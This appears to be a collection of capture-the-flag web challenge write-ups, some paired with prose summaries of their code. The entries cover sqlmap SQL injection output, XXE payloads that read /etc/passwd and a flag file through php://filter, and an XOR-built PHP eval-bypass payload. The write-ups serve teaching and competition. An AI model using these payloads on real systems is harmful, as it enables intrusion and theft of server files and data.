    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[00:05:14] [INFO] testing MySQL
[00:05:19] [INFO] confirming MySQL
[00:05:33] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:05:33] [INFO] fetching database names
[00:05:37] [INFO] used SQL query returns 2 entries
[00:05:42] [INFO] retrieved: information_schema
[00:05:46] [INFO] retrieved: ASISCTF
available databases [2]:
[*] ASISCTF
[*] information_schema

[00:05:46] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 00:05:46

user@host:~$ sqlmap -u ""https://poems.asisctf.com/books.php?type=excerpt&id=1"" -p id --delay 3 --dbms=mysql -D ASISCTF --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.4#stable}
|_ -| . [""]     | .'| . |
|___|_  [""]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:10:05

[00:10:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[00:10:10] [INFO] testing MySQL
[00:10:10] [INFO] confirming MySQL
[00:10:10] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:10:10] [INFO] fetching tables for database: 'ASISCTF'
[00:10:14] [INFO] used SQL query returns 1 entries
Database: ASISCTF
[1 table]
+-------+
| books |
+-------+

[00:10:19] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 00:10:19

user@host:~$ sqlmap -u ""https://poems.asisctf.com/books.php?type=excerpt&id=1"" -p id --delay 3 --dbms=mysql -D ASISCTF -T books --columns
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:11:07

[00:11:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[00:11:12] [INFO] testing MySQL
[00:11:12] [INFO] confirming MySQL
[00:11:12] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:11:12] [INFO] fetching columns for table 'books' in database 'ASISCTF'
[00:11:17] [INFO] used SQL query returns 2 entries
[00:11:21] [INFO] retrieved: ""id"",""int(11)""
[00:11:26] [INFO] retrieved: ""info"",""text""
Database: ASISCTF
Table: books
[2 columns]
+--------+---------+
| Column | Type    |
+--------+---------+
| id     | int(11) |
| info   | text    |
+--------+---------+

[00:11:26] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 00:11:26

user@host:~$ sqlmap -u ""https://poems.asisctf.com/books.php?type=excerpt&id=1"" -p id --delay 3 --dbms=mysql -D ASISCTF -T books --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.4#stable}
|_ -| . [""]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:12:16

[00:12:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[00:12:21] [INFO] testing MySQL
[00:12:21] [INFO] confirming MySQL
[00:12:21] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:12:21] [INFO] fetching columns for table 'books' in database 'ASISCTF'
[00:12:21] [INFO] used SQL query returns 2 entries
[00:12:21] [INFO] resumed: ""id"",""int(11)""
[00:12:21] [INFO] resumed: ""info"",""text""
[00:12:21] [INFO] fetching entries for table 'books' in database 'ASISCTF'
[00:12:25] [INFO] used SQL query returns 3 entries
[00:12:30] [WARNING] possible server trimmed output detected (probably due to its length and/or content): 1acszdq
[00:12:34] [WARNING] possible server trimmed output detected (probably due to its length and/or content): 2acszdq
[00:12:39] [WARNING] possible server trimmed output detected (probably due to its length and/or content): 3acszdq
[00:12:43] [WARNING] possible server trimmed output detected (probably due to its length and/or content): 1acszdq
[00:12:43] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[00:12:43] [INFO] fetching number of entries for table 'books' in database 'ASISCTF'
[00:12:43] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:12:43] [INFO] retrieved: 3
[00:13:15] [INFO] retrieved: 1
[00:13:56] [INFO] retrieved: <?xml version=""1.0"" encoding=""UTF-8""?> <book>   <id>1</id>   <name>Dīvān of Hafez</name>   <author>Khwāja Shams-ud-Dīn Muḥammad Ḥāfeẓ-e Shīrāzī</author>   <year>1315-1390</year>   <link>https://ganjoor.net/hafez/ghazal/sh255/</link>   <flag>Your flag is not here! Read more books :)</flag>   <excerpt>Joseph will come back to Canaan again,  My house the fragrance of her rose-garden will regain.  0 sad heart, from hardships do not get mad, Your worries will soon end- don&#8217;t feel so sad.  If the Spring on turf-throne would remain, The bird under flower-canopy sits again.   If the world turns to your favor some days, Take it easy; it won&#8217;t do so always.   If God&#8217;s secrets are unknown don&#8217;t des^C
[07:05:43] [WARNING] Ctrl+C detected in dumping phase
Database: ASISCTF
Table: books
[1 entry]
+----+------+
| id | info |
+----+------+
| 1  |
+----+------+

[07:05:43] [INFO] table 'ASISCTF.books' dumped to CSV file '/home/ubuntu/.sqlmap/output/poems.asisctf.com/dump/ASISCTF/books.csv'
[07:05:43] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 07:05:43
```

So at this point you know that a `<flag>` XML element is hidden into `books` table, but not into book with `id = 1`; you can launch a custom query to exfiltrate only the `info` column for other books: `select info from ASISCTF.books where id > 1`.

```
user@host:~$ sqlmap -u ""https://poems.asisctf.com/books.php?type=excerpt&id=1"" -p id --delay 1 --dbms=mysql -D ASISCTF -T books --sql-query=""select info from ASISCTF.books where id > 1""
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 07:08:11

[07:08:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[07:08:14] [INFO] testing MySQL
[07:08:14] [INFO] confirming MySQL
[07:08:14] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[07:08:14] [INFO] fetching SQL SELECT statement query output: 'select info from ASISCTF.books where id > 1'
[07:08:17] [INFO] used SQL query returns 2 entries
[07:08:24] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[07:08:24] [INFO] retrieved: 2
the SQL query provided can return 2 entries. How many entries do you want to retrieve?
[a] All (default)
[#] Specific number
[q] Quit
> a
[07:09:42] [INFO] retrieved: <?xml version=""1.0"" encoding=""UTF-8""?> <book>   <id>2</id>   <name>Gulistan of Saadi</name>   <author>Abū-Muhammad Muslih al-Dīn bin Abdallāh Shīrāzī, the Saadi</author>   <year>1258</year>   <link>https://ganjoor.net/saadi/golestan/gbab1/sh36/</link>   <flag>OK! You can use ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884} flag, but I keep the `/flag` file secure :-/</flag> ^C

[09:05:56] [WARNING] user aborted during dumping phase
[09:05:56] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 09:05:56
```

The flag is the following.

```
ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884}
```
","The website contains a list of books with two actions available:
an excerpt to read an excerpt of the book;
read online which opens a link from another domain, not related to the challenge.

Analyzing the HTML source of the page a treasury.js file can be found; it is interesting to understand performed calls.

[Defines two functions: ""anexcerpt"" and ""readonline"" using JavaScript. The ""anexcerpt"" function creates a modal element and fetches an excerpt from a book using AJAX. The excerpt is then displayed in a text area inside the modal. The ""readonline"" function opens a new window with a link to read the book online.]

The home page is created with the following request.

[HTTP request to the server. The server responds with a 200 OK status code and returns a JSON array of books.]

The excerpt button performs a request like the following.

[HTTP GET request. The server responds with an HTTP 200 OK status code and returns a text/html response.]

The read online button simply opens a window redirecting to the link specified for the book.

A URL like the following will reveal that web application is vulnerable to SQL injection, because the result of the book with `id=1` will be printed.

[URL containing parameters for exploit SQL injection vulnerability]

The following URL will spawn a weird error.

[Warning messages indicating that there was an error in loading an XML string.]

It seems that the web application reads XML from a database.

You could use `sqlmap` to retrieve information.

[Output of a SQL injection test performed using the sqlmap tool]

So at this point you know that a `<flag>` XML element is hidden into `books` table, but not into book with `id = 1`; you can launch a custom query to exfiltrate only the `info` column for other books: `select info from ASISCTF.books where id > 1`.

[Command-line output of a successful SQL injection attack using the tool ""sqlmap""]

The flag is the following.
"
"## Treasury 2

* **Category:** web
* **Points:** 53

### Challenge

> A Cultural Treasury
> 
> https://poems.asisctf.com/

### Solution

Considering the XML-related error spawned previously and the hint provided into the `<flag>` element talking about a `/flag` file, you can understand that the application can be exploited via a XXE attack.

The malicious payload can be crafted and passed via the SQL injection vulnerability using a `UNION` operation. The application will parse the XML payload triggering the remote file read operation.

Let's consider a payload like the following to test the exploit.

```
Payload:

<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><book><id>0</id><name>n</name><author>a</author><year>0</year><link>l</link><flag>f</flag><excerpt>&xxe;</excerpt></book>

URL-encoded payload:

%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E

Malicious URL:

https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%20%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E%27%20%23

Result:

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

So it is possible to read remote files. PHP filters can be used to read source code via base64 encoding.

```
Payload:

<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""php://filter/convert.base64-encode/resource=/flag"" >]><book><id>0</id><name>n</name><author>a</author><year>0</year><link>l</link><flag>f</flag><excerpt>&xxe;</excerpt></book>

URL-encoded payload:

%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E

Malicious URL:

https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%20%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E%27%20%23

Result:

QVNJU3swMzQ4MmIxODIxMzk4Y2NiNTIxNGQ4OTFhZWQzNWRjODdkM2E3N2IyfQo=
```

Decoding the base64 encoded result you can obtain the flag.

```
ASIS{03482b1821398ccb5214d891aed35dc87d3a77b2}
```
","Considering the XML-related error spawned previously and the hint provided into the `<flag>` element talking about a `/flag` file, you can understand that the application can be exploited via a XXE attack.

The malicious payload can be crafted and passed via the SQL injection vulnerability using a `UNION` operation. The application will parse the XML payload triggering the remote file read operation.

Let's consider a payload like the following to test the exploit.

[XML External Entity (XXE) Injection attack payload and result, where an attacker exploits a vulnerability in an XML parser to retrieve sensitive information from the target system. The payload is a malicious XML file that includes an external entity that points to a file (/etc/passwd) that the attacker wants to retrieve. The URL-encoded payload is used in the malicious URL to retrieve the file. The result shows the contents of the /etc/passwd file, indicating that the attack was successful.]

So it is possible to read remote files. PHP filters can be used to read source code via base64 encoding.

[Payload and URL-encoded payload of an XML External Entity (XXE) injection attack, along with the resulting encoded flag obtained from the attack on a vulnerable web application.]

Decoding the base64 encoded result you can obtain the flag.
"
"# ASIS CTF Quals 2020 – Web Warm-up

* **Category:** web
* **Points:** 33

## Challenge

> Warm up! Can you break all the tasks? I'll pray for you!
> 
> read flag.php
> 
> Link: http://69.90.132.196:5003/?view-source

## Solution

You have to read the `flag.php` file. Connecting to the URL you can see the following source code.

```php
<?php
if(isset($_GET['view-source'])){
    highlight_file(__FILE__);
    die();
}

if(isset($_GET['warmup'])){
    if(!preg_match('/[A-Za-z]/is',$_GET['warmup']) && strlen($_GET['warmup']) <= 60) {
    eval($_GET['warmup']);
    }else{
        die(""Try harder!"");
    }
}else{
    die(""No param given"");
}
```

There is an `eval` execution over the `warmup` GET parameter, but this parameter is checked in a very strict way, so there is no possibility to invoke functions directly.

Luckily, some techniques to bypass this kind of checks exist and [I've used them before](https://github.com/m3ssap0/CTF-Writeups/blob/b83e31b155a13d642e527968a9375c295c6a6977/Inferno%20CTF%202019/Dank%20PHP/README.md).

The best way to attack the endpoint is to read another HTTP GET parameter, with non-alfanumeric name, e.g. `_`.

I found two interesting websites:
* [Bypass WAF - Php webshell without numbers and letters](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/);
* [`preg_match` Code Execution](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#preg_match-code-execution).

In the second website, there is the same scenario of the challenge, so I used it to craft my payload.

Using bitwise XOR operation in PHP, you can craft `_GET` string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric name.

```php
$_=""`{{{""^""?<>/""; // This is: ""_GET"" string.
```

Then you can specify the execution of the content of a GET parameter with the following code.

```php
${$_}[_]();       // This is $_GET[_]()
```

So the payload that will be executed by the `eval` instruction will be the following.

```php
$_=""`{{{""^""?<>/"";${$_}[_]();
```

Using a payload like the following, will let you to execute the `phpinfo` page.

```
http://69.90.132.196:5003/?warmup=$_=%22`{{{%22^%22?%3C%3E/%22;${$_}[_]();&_=phpinfo
```

The complete payload is the following.

```
http://69.90.132.196:5003/?warmup=$_=%22`{{{%22^%22?%3C%3E/%22;$_0=${$_}[_](${$_}[__]);${$_}[___]($_0);&_=file_get_contents&__=flag.php&___=var_dump
```

It can be composed step by step.

```php
$_=""`{{{""^""?<>/"";          // This is _GET string representation composed before.
$_0=${$_}[_](${$_}[__]);   // This is $_0 = $_GET[_]($_GET[__]) and it is used to perform: file_get_contents(""flag.php"")
${$_}[___]($_0);           // This is $_GET[___]($_0) and it is used to perform: var_dump($_0)
```

The result of the attack will be the following.

```
string(46) ""<?php
$flag = ""ASIS{w4rm_up_y0ur_br4in}"";
?>""
```","You have to read the `flag.php` file. Connecting to the URL you can see the following source code.

[PHP code that checks if the ""view-source"" or ""warmup"" parameters are present in the URL query string. If ""view-source"" is present, the script outputs the contents of the current file. If ""warmup"" is present and contains only non-alphabetic characters and is less than or equal to 60 characters in length, the script executes the contents of the ""warmup"" parameter using the eval() function. Otherwise, the script outputs ""Try harder!"" or ""No param given"" depending on whether the ""warmup"" parameter is missing or invalid.]

There is an `eval` execution over the `warmup` GET parameter, but this parameter is checked in a very strict way, so there is no possibility to invoke functions directly.

Luckily, some techniques to bypass this kind of checks exist.

The best way to attack the endpoint is to read another HTTP GET parameter, with non-alfanumeric name, e.g. `_`.

I found two interesting websites:
[Bypass WAF - Php webshell without numbers and letters]
[`preg_match` Code Execution]

In the second website, there is the same scenario of the challenge, so I used it to craft my payload.

Using bitwise XOR operation in PHP, you can craft `_GET` string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric name.

[PHP code that assigns the string ""GET"" to the variable named ""_"" using bitwise XOR.]

Then you can specify the execution of the content of a GET parameter with the following code.

[PHP code that executes a function specified in the value of the ""_GET"" variable.]

So the payload that will be executed by the `eval` instruction will be the following.

Using a payload like the following, will let you to execute the `phpinfo` page.

The complete payload is the following.

The result of the attack will be the flag."
"# AUCTF 2020 – API madness

* **Category:** web
* **Points:** 926

## Challenge

> http://challenges.auctf.com:30023
> 
> We are building out our new API. We even have authentication built in!
> 
> Author: shinigami

## Solution

Connecting to `http://challenges.auctf.com:30023` you will get the following message.

```
{
  ""NOTE"": ""For API help visit our help page /static/help"", 
  ""status"": ""OK""
}
```

The help page at `http://challenges.auctf.com:30023/static/help` will give you the following information.

```html
<html>
<body>
<center><h1>FTP Server API Help Page</h1></center>
<br>
<br>
<h2>Endpoints</h2>
<p>/api/login - POST</p>
<p>/api/ftp/dir - POST</p>
<p>/api/ftp/get_file - POST</p>
</br>
</br>
<h2>Params</h2>
<p>/api/login - username, password</p>
<p>/ftp/dir - dir</p>
<p>/ftp/get_file - file</p>
</body>
</html>
```

So the following API endpoints are available:
* `/api/login` - `HTTP POST` with `username`, `password` JSON parameters;
* `/api/ftp/dir` - `HTTP POST` with `dir` JSON parameter;
* `/api/ftp/get_file` - `HTTP POST` with `file` JSON parameter.

Using the `/api/login` endpoint an error page will appear.

```html
<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN""
  ""http://www.w3.org/TR/html4/loose.dtd"">
<html>
  <head>
    <title>ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('&lt;urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0&gt;: Failed to establish a new connection: [Errno 110] Connection timed out',)) // Werkzeug Debugger</title>
    <link rel=""stylesheet"" href=""?__debugger__=yes&amp;cmd=resource&amp;f=style.css""
        type=""text/css"">
    <!-- We need to make sure this has a favicon so that the debugger does
         not by accident trigger a request to /favicon.ico which might
         change the application state. -->
    <link rel=""shortcut icon""
        href=""?__debugger__=yes&amp;cmd=resource&amp;f=console.png"">
    <script src=""?__debugger__=yes&amp;cmd=resource&amp;f=jquery.js""></script>
    <script src=""?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js""></script>
    <script type=""text/javascript"">
      var TRACEBACK = 140737215262864,
          CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = ""OG4SiyCTEaRwR1zKkBzE"";
    </script>
  </head>
  <body style=""background-color: #fff"">
    <div class=""debugger"">
<h1>requests.exceptions.ConnectionError</h1>
<div class=""detail"">
  <p class=""errormsg"">ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('&lt;urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0&gt;: Failed to establish a new connection: [Errno 110] Connection timed out',))</p>
</div>
<h2 class=""traceback"">Traceback <em>(most recent call last)</em></h2>
<div class=""traceback"">

  <ul><li><div class=""frame"" id=""frame-140737210047568"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/flask/app.py""</cite>,
      line <em class=""line"">2463</em>,
      in <code class=""function"">__call__</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws""></span> </pre>
<pre class=""line before""><span class=""ws"">    </span>def __call__(self, environ, start_response):</pre>
<pre class=""line before""><span class=""ws"">        </span>&quot;&quot;&quot;The WSGI server calls the Flask application object as the</pre>
<pre class=""line before""><span class=""ws"">        </span>WSGI application. This calls :meth:`wsgi_app` which can be</pre>
<pre class=""line before""><span class=""ws"">        </span>wrapped to applying middleware.&quot;&quot;&quot;</pre>
<pre class=""line current""><span class=""ws"">        </span>return self.wsgi_app(environ, start_response)</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws"">    </span>def __repr__(self):</pre>
<pre class=""line after""><span class=""ws"">        </span>return &quot;&lt;%s %r&gt;&quot; % (self.__class__.__name__, self.name)</pre></div>
</div>

<li><div class=""frame"" id=""frame-140737214819088"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/flask/app.py""</cite>,
      line <em class=""line"">2449</em>,
      in <code class=""function"">wsgi_app</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws"">            </span>try:</pre>
<pre class=""line before""><span class=""ws"">                </span>ctx.push()</pre>
<pre class=""line before""><span class=""ws"">                </span>response = self.full_dispatch_request()</pre>
<pre class=""line before""><span class=""ws"">            </span>except Exception as e:</pre>
<pre class=""line before""><span class=""ws"">                </span>error = e</pre>
<pre class=""line current""><span class=""ws"">                </span>response = self.handle_exception(e)</pre>
<pre class=""line after""><span class=""ws"">            </span>except:  # noqa: B001</pre>
<pre class=""line after""><span class=""ws"">                </span>error = sys.exc_info()[1]</pre>
<pre class=""line after""><span class=""ws"">                </span>raise</pre>
<pre class=""line after""><span class=""ws"">            </span>return response(environ, start_response)</pre>
<pre class=""line after""><span class=""ws"">        </span>finally:</pre></div>
</div>

<li><div class=""frame"" id=""frame-140737214819152"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/flask/app.py""</cite>,
      line <em class=""line"">1866</em>,
      in <code class=""function"">handle_exception</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws"">            </span># if we want to repropagate the exception, we can attempt to</pre>
<pre class=""line before""><span class=""ws"">            </span># raise it with the whole traceback in case we can do that</pre>
<pre class=""line before""><span class=""ws"">            </span># (the function was actually called from the except part)</pre>
<pre class=""line before""><span class=""ws"">            </span># otherwise, we just raise the error again</pre>
<pre class=""line before""><span class=""ws"">            </span>if exc_value is e:</pre>
<pre class=""line current""><span class=""ws"">                </span>reraise(exc_type, exc_value, tb)</pre>
<pre class=""line after""><span class=""ws"">            </span>else:</pre>
<pre class=""line after""><span class=""ws"">                </span>raise e</pre>
<pre class=""line after""><span class=""ws""></span> </pre>
<pre class=""line after""><span class=""ws"">        </span>self.log_exception((exc_type, exc_value, tb))</pre>
<pre class=""line after""><span class=""ws"">        </span>server_error = InternalServerError()</pre></div>
</div>

<li><div class=""frame"" id=""frame-140737182617552"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/flask/app.py""</cite>,
      line <em class=""line"">2446</em>,
      in <code class=""function"">wsgi_app</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws"">        </span>ctx = self.request_context(environ)</pre>
<pre class=""line before""><span class=""ws"">        </span>error = None</pre>
<pre class=""line before""><span class=""ws"">        </span>try:</pre>
<pre class=""line before""><span class=""ws"">            </span>try:</pre>
<pre class=""line before""><span class=""ws"">                </span>ctx.push()</pre>
<pre class=""line current""><span class=""ws"">                </span>response = self.full_dispatch_request()</pre>
<pre class=""line after""><span class=""ws"">            </span>except Exception as e:</pre>
<pre class=""line after""><span class=""ws"">                </span>error = e</pre>
<pre class=""line after""><span class=""ws"">                </span>response = self.handle_exception(e)</pre>
<pre class=""line after""><span class=""ws"">            </span>except:  # noqa: B001</pre>
<pre class=""line after""><span class=""ws"">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class=""frame"" id=""frame-140737182616784"">
  <h4>File <cite class=""filename"">""/usr/local/lib/python2.7/site-packages/flask/app.py""</cite>,
      line <em class=""line"">1951</em>,
      in <code class=""function"">full_dispatch_request</code></h4>
  <div class=""source library""><pre class=""line before""><span class=""ws"">            </span>request_started.send(self)</pre>
<pre class=""line before""><span class=""ws"">            </span>rv = self.preprocess_request()</pre>
<pre class=""line before""><span class=""ws"">            </span>if rv is None:</pre>
